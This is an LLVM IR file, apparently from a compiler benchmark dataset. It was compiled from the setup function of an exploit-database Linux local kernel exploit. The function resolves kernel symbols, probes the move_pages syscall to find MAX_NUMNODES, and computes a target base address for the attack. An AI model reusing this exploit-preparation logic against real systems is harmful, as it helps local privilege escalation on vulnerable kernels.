; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40810.c_prepare.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40810.c_prepare.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64 (i8*)* }

@exp_state = common dso_local global %struct.TYPE_2__* null, align 8
@.str = private unnamed_addr constant [16 x i8] c"totalhigh_pages\00", align 1
@totalhigh_pages = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"node_states\00", align 1
@node_states = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [16 x i8] c"node_online_map\00", align 1
@node_online_map = common dso_local global i64 0, align 8
@buf = common dso_local global i32 0, align 4
@__NR_move_pages = common dso_local global i32 0, align 4
@MPOL_MF_MOVE = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@ENOSYS = common dso_local global i64 0, align 8
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [52 x i8] c"Error: move_pages is not supported on this kernel.\0A\00", align 1
@ENODEV = common dso_local global i64 0, align 8
@max_numnodes = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [34 x i8] c" [+] Detected MAX_NUMNODES as %d\0A\00", align 1
@our_base = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [42 x i8] c"Error: kernel doesn't appear vulnerable.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @prepare(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %8 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %9 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %8, i32 0, i32 0
  %10 = load i64 (i8*)*, i64 (i8*)** %9, align 8
  %11 = call i64 %10(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  store i64 %11, i64* @totalhigh_pages, align 8
  %12 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %13 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %12, i32 0, i32 0
  %14 = load i64 (i8*)*, i64 (i8*)** %13, align 8
  %15 = call i64 %14(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  store i64 %15, i64* @node_states, align 8
  %16 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %17 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %16, i32 0, i32 0
  %18 = load i64 (i8*)*, i64 (i8*)** %17, align 8
  %19 = call i64 %18(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  store i64 %19, i64* @node_online_map, align 8
  %20 = call i32 @malloc(i32 4096)
  store i32 %20, i32* @buf, align 4
  store i32 0, i32* %5, align 4
  br label %21

21:                                               ; preds = %52, %1
  %22 = load i32, i32* %5, align 4
  %23 = icmp slt i32 %22, 512
  br i1 %23, label %24, label %55

24:                                               ; preds = %21
  %25 = load i32, i32* %5, align 4
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* @__NR_move_pages, align 4
  %27 = load i32, i32* @MPOL_MF_MOVE, align 4
  %28 = call i32 @syscall(i32 %26, i32 0, i32 1, i32* @buf, i32* %3, i32* %7, i32 %27)
  store i32 %28, i32* %6, align 4
  %29 = load i64, i64* @errno, align 8
  %30 = load i64, i64* @ENOSYS, align 8
  %31 = icmp eq i64 %29, %30
  br i1 %31, label %32, label %36

32:                                               ; preds = %24
  %33 = load i32, i32* @stdout, align 4
  %34 = call i32 (i32, i8*, ...) @fprintf(i32 %33, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.3, i64 0, i64 0))
  %35 = call i32 @exit(i32 1) #3
  unreachable

36:                                               ; preds = %24
  %37 = load i64, i64* @errno, align 8
  %38 = load i64, i64* @ENODEV, align 8
  %39 = icmp eq i64 %37, %38
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 1, i32* %4, align 4
  br label %50

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  %43 = icmp eq i32 %42, 1
  br i1 %43, label %44, label %49

44:                                               ; preds = %41
  %45 = load i32, i32* %5, align 4
  store i32 %45, i32* @max_numnodes, align 4
  %46 = load i32, i32* @stdout, align 4
  %47 = load i32, i32* @max_numnodes, align 4
  %48 = call i32 (i32, i8*, ...) @fprintf(i32 %46, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0), i32 %47)
  br label %55

49:                                               ; preds = %41
  br label %50

50:                                               ; preds = %49, %40
  br label %51

51:                                               ; preds = %50
  br label %52

52:                                               ; preds = %51
  %53 = load i32, i32* %5, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %5, align 4
  br label %21

55:                                               ; preds = %44, %21
  %56 = load i64, i64* @node_online_map, align 8
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %60

58:                                               ; preds = %55
  %59 = load i64, i64* @node_online_map, align 8
  store i64 %59, i64* @our_base, align 8
  br label %84

60:                                               ; preds = %55
  %61 = load i64, i64* @node_states, align 8
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %63, label %79

63:                                               ; preds = %60
  %64 = load i64, i64* @node_states, align 8
  %65 = load i64, i64* @totalhigh_pages, align 8
  %66 = icmp ne i64 %65, 0
  br i1 %66, label %67, label %71

67:                                               ; preds = %63
  %68 = load i32, i32* @max_numnodes, align 4
  %69 = sdiv i32 %68, 8
  %70 = mul nsw i32 3, %69
  br label %75

71:                                               ; preds = %63
  %72 = load i32, i32* @max_numnodes, align 4
  %73 = sdiv i32 %72, 8
  %74 = mul nsw i32 2, %73
  br label %75

75:                                               ; preds = %71, %67
  %76 = phi i32 [ %70, %67 ], [ %74, %71 ]
  %77 = sext i32 %76 to i64
  %78 = add nsw i64 %64, %77
  store i64 %78, i64* @our_base, align 8
  br label %83

79:                                               ; preds = %60
  %80 = load i32, i32* @stdout, align 4
  %81 = call i32 (i32, i8*, ...) @fprintf(i32 %80, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.5, i64 0, i64 0))
  %82 = call i32 @exit(i32 1) #3
  unreachable

83:                                               ; preds = %75
  br label %84

84:                                               ; preds = %83, %58
  ret i32 0
}

declare dso_local i32 @malloc(i32) #1

declare dso_local i32 @syscall(i32, i32, i32, i32*, i32*, i32*, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
